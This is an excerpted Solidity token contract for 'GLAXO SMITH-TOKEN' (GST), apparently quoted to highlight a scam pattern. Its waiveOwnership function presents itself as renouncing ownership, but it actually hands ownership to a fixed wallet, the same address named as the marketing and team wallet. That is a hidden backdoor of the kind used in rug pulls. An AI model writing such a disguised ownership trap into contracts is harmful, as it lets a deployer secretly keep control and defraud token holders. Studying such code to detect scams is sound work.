...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x627b5D1c935C721cf18E99A196a47dc899297476);
    }
...
contract GLAXOSMITHTOKEN is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "GLAXO SMITH-TOKEN";
    string private _symbol = "GST";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x627b5D1c935C721cf18E99A196a47dc899297476);
    address payable public teamWalletAddress = payable(0x627b5D1c935C721cf18E99A196a47dc899297476);
